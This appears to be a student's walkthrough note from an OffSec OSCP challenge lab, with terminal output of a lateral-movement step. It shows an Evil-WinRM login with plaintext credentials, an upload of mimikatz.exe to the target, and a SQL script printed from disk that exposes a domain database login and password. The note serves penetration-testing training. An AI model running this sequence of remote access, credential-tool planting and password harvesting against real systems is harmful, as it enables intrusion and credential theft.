┌──(kali㉿kali)-\[~/OffSec/PEN-200_OSCP+/ChallengeLab/Zeus\]

└─$ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .

┌──(kali㉿kali)-\[~/OffSec/PEN-200_OSCP+/ChallengeLab/Zeus\]

└─$ evil-winrm -i 192.168.143.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method \`quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload mimikatz.exe

Info: Uploading /home/kali/OffSec/PEN-200_OSCP+/ChallengeLab/Zeus/mimikatz.exe to C:\Users\eric.wallows\Documents\mimikatz.exe

Data: 1807016 bytes of 1807016 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\eric.wallows\Documents>

![[Information for rateral image.png]]

c:\SQL> dir

Volume in drive C has no label.

Volume Serial Number is 8EFE-8A20

Directory of c:\SQL

06/26/2022  09:00 PM    \<DIR>          .

06/26/2022  09:00 PM    \<DIR>          ..

06/26/2022  08:53 PM               528 connection.sql

1 File(s)            528 bytes

2 Dir(s)  29,439,344,640 bytes free

c:\SQL> type connection.sql

$SqlServer    = 'DC01'

$Database     = 'master'

$SqlAuthLogin = 'zeus.corp\db_user'

$SqlAuthPw    = 'Password123!'

\# query to show changes

$Query = '

SELECT @@SERVERNAME AS \[ServerName\]

, des.login_name

, DB_NAME()   AS \[DatabaseName\]

, dec.net_packet_size

, @@LANGUAGE  AS \[Language\]

, des.program_name

, des.host_name

FROM sys.dm_exec_connections dec

JOIN sys.dm_exec_sessions des ON dec.session_id = des.session_id

WHERE dec.session_id = @@SPID

'

\### Add Additional queries here ###

![[Information for rateral image 1.png]]